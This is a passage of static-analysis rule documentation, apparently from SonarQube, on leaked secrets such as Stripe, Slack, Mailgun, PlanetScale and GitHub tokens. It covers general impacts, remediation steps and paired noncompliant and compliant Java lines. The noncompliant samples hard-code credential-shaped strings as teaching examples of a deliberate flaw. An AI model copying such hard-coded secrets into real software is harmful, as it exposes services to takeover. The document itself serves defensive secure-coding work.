<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this {secret_type} to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>Chaining of vulnerabilities</h4>
<p>Triggering arbitrary workflows can lead to problems ranging from a denial of service to worse, depending on how the webhook’s data is handled. If
the webhook performs a specific action that is affected by a vulnerability, the webhook acts as a remote attack vector on the enterprise.</p>
<p>Components affected by this webhook could, for example, experience unexpected failures or excessive resource consumption. If it is a single point
of failure (SPOF), this leak is critical.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("fcm_key", "cfUDlZL9YBQ:APA91bJxU9oMf3RbiyqnmUO60KU_JLawjf2yrTfSs3_ZAp3dxZS0J88G5P5AoKWoviAdUK5i-2SB7iHcb4Wd38EMsZXBAAb6GZMaSOeKfaI0DuLxAFTOgGNKRSmj2R9gIQyzpjoThmqe") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("fcm_key", System.getenv("FCM_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6753">
              secrets:S6753
            </a>
          </td>
          <td>
            <details>
              <p>Zuplo is an API management platform built for developers. It handles authentification and access to your API and provides additional
functionalities such as rate limiting the number of requests to your backend. In order for your backend to validate that a request has been processed
by Zuplo, it relies on an API key generated in Zuplo Developer Portal. If this key is compromised, attackers will be able to bypass Zuplo and access
your API without authentication and authorization.</p>
<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>The exact impact of a Zuplo API key being leaked varies greatly depending on the type of services the software is used to implement. In general,
consequences ranging from a denial of service to application compromise can be expected.</p>
<h4>Chaining of vulnerabilities</h4>
<p>Triggering arbitrary workflows can lead to problems ranging from a denial of service to worse, depending on how the webhook’s data is handled. If
the webhook performs a specific action that is affected by a vulnerability, the webhook acts as a remote attack vector on the enterprise.</p>
<p>Components affected by this webhook could, for example, experience unexpected failures or excessive resource consumption. If it is a single point
of failure (SPOF), this leak is critical.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("zapi_key", "zpka_213d294a9a5a44619cd6a02e55a20417_5f43e4d0") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("zapi_key", System.getenv("ZAPI_KEY"))
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Zuplo API documentation - <a href="https://zuplo.com/docs/articles/api-key-management">API Keys Overview</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6719">
              secrets:S6719
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Disclosure of blockchain data</h4>
<p>The leaked key can be used to query APIs of blockchain services and access sensitive information stored in the service metadata. This may include
user identities and other sensitive data.<br> Such disclosure compromises user privacy and confidentiality.</p>
<h4>Breach of trust in non-repudiation and disruption of the audit trail</h4>
<p>When such a secret is compromised, malicious actors might have the possibility to send malicious event objects, causing discrepancies in the audit
trail. This can make it difficult to trace and verify the sequence of events, impacting the ability to investigate and identify unauthorized or
fraudulent activity.</p>
<p>All in all, this can lead to problems in proving the validity of transactions or actions performed, potentially leading to disputes and legal
complications.</p>
<h4>Financial loss</h4>
<p>Since this secret is used to process transaction-related operations, financial loss may also occur if transaction-related objects are corrupted or
the account is tampered with.<br> This can range from indirect losses to direct unauthorized transfers of funds that can lead to bankruptcy or
impoverishment of individuals.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("alchemy_eth_api_key", "https://eth-mainnet.alchemyapi.io/v2/sAwFYc32ctGA_VSdesa72bheDxfGWRWl") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("alchemy_eth_api_key", System.getenv("ALCHEMY_ETH_API_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6718">
              secrets:S6718
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Stripe endpoint secrets allow webhooks to verify that requests to a user-owned webhook really originated from Stripe. This data can be used to
transmit thousands of different types of <a href="https://stripe.com/docs/api/events/types">sensitive events</a>.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Breach of trust in non-repudiation and disruption of the audit trail</h4>
<p>When such a secret is compromised, malicious actors might have the possibility to send malicious event objects, causing discrepancies in the audit
trail. This can make it difficult to trace and verify the sequence of events, impacting the ability to investigate and identify unauthorized or
fraudulent activity.</p>
<p>All in all, this can lead to problems in proving the validity of transactions or actions performed, potentially leading to disputes and legal
complications.</p>
<h4>Financial loss</h4>
<p>Since this secret is used to process transaction-related operations, financial loss may also occur if transaction-related objects are corrupted or
the account is tampered with.<br> This can range from indirect losses to direct unauthorized transfers of funds that can lead to bankruptcy or
impoverishment of individuals.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("stripe_endpoint_secret", "whsec_3cAgzYnf0seUtVzSAP08cH9nDICqwI1T") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("stripe_endpoint_secret", System.getenv("STRIPE_ENDPOINT_SECRET"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6717">
              secrets:S6717
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Slack Workflow webhook URLs have different effects depending on their permissions: They can be used only to write Slack posts or to trigger other
workflows.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this webhook to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>Chaining of vulnerabilities</h4>
<p>Triggering arbitrary workflows can lead to problems ranging from a denial of service to worse, depending on how the webhook’s data is handled. If
the webhook performs a specific action that is affected by a vulnerability, the webhook acts as a remote attack vector on the enterprise.</p>
<p>Components affected by this webhook could, for example, experience unexpected failures or excessive resource consumption. If it is a single point
of failure (SPOF), this leak is critical.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("slack_webhook_url", "https://hooks.slack.com/workflows/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") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("slack_webhook_url", System.getenv("SLACK_WEBHOOK_URL"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6723">
              secrets:S6723
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Mailgun API keys provide complete control over the Mailgun account and allow sending bulk emails.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Compromise of sensitive personal data</h4>
<p>This kind of service is often used to exchange information that could include personal information, chat logs, and other private data that users
have shared on the platform. This is called <a href="https://gdpr.eu/eu-gdpr-personal-data/"><code>Personally Identifiable Information</code></a>.<br>
The leaked app key could provide a gateway for unauthorized individuals to access and misuse this data, compromising the privacy and safety of the
application users.</p>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If this kind of sensitive personal data
gets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this secret to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>Account termination</h4>
<p>Unauthorized access to mailing service API keys can also result in resource abuse. Attackers can exploit the API keys to send a large volume of
spam emails or perform other resource-intensive operations, causing a significant strain on the mailing service provider’s infrastructure.</p>
<p>The service provider, being vigilant about such activities, may flag your account and take action against it. This could lead to the suspension or
termination of the compromised account, thus causing significant inconvenience and potential loss of communication with your customers or
partners.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("mailgun_key", "key-9392bf4edd483c111748f422750442fe") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("mailgun_key", System.getenv("MAILGUN_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6722">
              secrets:S6722
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>PlanetScale Database passwords are used to authenticate users against the database engine. They are associated with user accounts that are granted
specific permissions over the database and its hosted data.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Application’s security downgrade</h4>
<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the
affected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting
server or another linked component.</p>
<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.
An attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("planetscale_password", "pscale_pw_hatgoG_EprhgnblWotaJGbeOeFE7q9BwW0_g5ML486D") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("planetscale_password", System.getenv("PLANETSCALE_PASSWORD"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6689">
              secrets:S6689
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>GitHub tokens are used for authentication and authorization purposes when interacting with the GitHub API. They serve as a way to identify and
authenticate users or applications that are making requests to the GitHub API.</p>
<p>The consequences vary greatly depending on the situation and the secret-exposed audience. Still, two main scenarios should be considered.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h4>Application’s security downgrade</h4>
<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the
affected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting
server or another linked component.</p>
<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.
An attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("token", "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") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("token", System.getenv("TOKEN"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<p>GitHub documentation - <a
href="https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens">Managing your personal
access tokens</a></p>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6721">
              secrets:S6721
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Teams Workflow webhook URLs have different effects depending on their permissions: They can be used only to write Teams posts or to trigger other
workflows.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this {secret_type} to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>Chaining of vulnerabilities</h4>
<p>Triggering arbitrary workflows can lead to problems ranging from a denial of service to worse, depending on how the webhook’s data is handled. If
the webhook performs a specific action that is affected by a vulnerability, the webhook acts as a remote attack vector on the enterprise.</p>
<p>Components affected by this webhook could, for example, experience unexpected failures or excessive resource consumption. If it is a single point
of failure (SPOF), this leak is critical.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
